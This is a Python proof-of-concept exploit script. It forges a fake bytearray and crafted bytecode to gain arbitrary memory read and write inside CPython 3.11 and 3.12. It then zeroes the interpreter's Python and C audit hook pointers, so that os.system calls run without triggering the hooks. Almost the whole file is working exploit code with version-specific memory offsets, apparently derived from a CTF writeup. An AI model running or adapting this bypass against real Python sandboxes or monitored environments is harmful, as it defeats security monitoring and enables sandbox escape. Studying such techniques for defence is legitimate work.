#!./audit_hook_head_finder

import opcode
import sys
import os
from audit_hook_head_finder import add_audit

if sys.version_info[:2] == (3, 12):
    if sys.version_info[2] <= 3:
        PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
    else:
        PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
else:
    # there are multiple offsets for 3.11? check the result of POC-no-ctypes.py
    PTR_OFFSET = [24, 48, 0x4d558, 0x3e3d0]

# The following bytecode exploit payload is based on https://www.da.vidbuchanan.co.uk/blog/35c3ctf-collection-writeup.html

# packing utilities
def p8(x):
    return bytes([x & 0xff])

def p64(x):
    return bytes([(x >> i) & 0xff for i in range(0, 64, 8)])

# Need at least one constant.
# Only required for python in [3.12.1, 3.12.3]. idk why
const_tuple = (None,)

# construct the fake bytearray
fake_bytearray = bytearray(
    p64(0x41414141) +          # ob_refcnt
    p64(id(bytearray)) +       # ob_type
    p64(0x7fffffffffffffff) +  # ob_size (INT64_MAX)
    p64(0) +                   # ob_alloc (doesn't seem to really be used?)
    p64(0) +                   # *ob_bytes (start at address 0)
    p64(0) +                   # *ob_start (ditto)
    p64(0)                     # ob_exports (not really sure what this does)
)

fake_bytearray_ptr_addr = id(fake_bytearray) + 0x20
const_tuple_array_start = id(const_tuple) + 0x18
offset = (fake_bytearray_ptr_addr - const_tuple_array_start) // 8

# construct the bytecode
bytecode = b''
# bytecode += p8(opcode.opmap["RESUME"]) + p8(0) # optional
for i in range(24, 0, -8):
    bytecode += p8(opcode.opmap["EXTENDED_ARG"]) + p8(offset >> i)
bytecode += p8(opcode.opmap["LOAD_CONST"]) + p8(offset)
bytecode += p8(opcode.opmap["RETURN_VALUE"]) + p8(0)

def foo():
    pass

foo.__code__ = foo.__code__.replace(co_code=bytecode, co_consts=const_tuple)

magic = foo()  # magic is arbitrary read and write now
# --- exploit payload ends here ---

add_audit()
sys.addaudithook(print)
print("--- finished setup ---")

# get addr from str helper func
getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)

os.system("echo 'test audit hook -- this will trigger hook'")

ptr = getptr(os.system.__init__) + PTR_OFFSET[0]
ptr = int.from_bytes(magic[ptr:ptr + 8], 'little') + PTR_OFFSET[1]

audit_hook_by_py = int.from_bytes(magic[ptr:ptr + 8], 'little') + PTR_OFFSET[2]
audit_hook_by_c = int.from_bytes(magic[ptr:ptr + 8], 'little') + PTR_OFFSET[3]
magic[audit_hook_by_py:audit_hook_by_py + 8] = [0] * 8
magic[audit_hook_by_c:audit_hook_by_c + 8] = [0] * 8

os.system("echo 'test audit hook -- this will not'")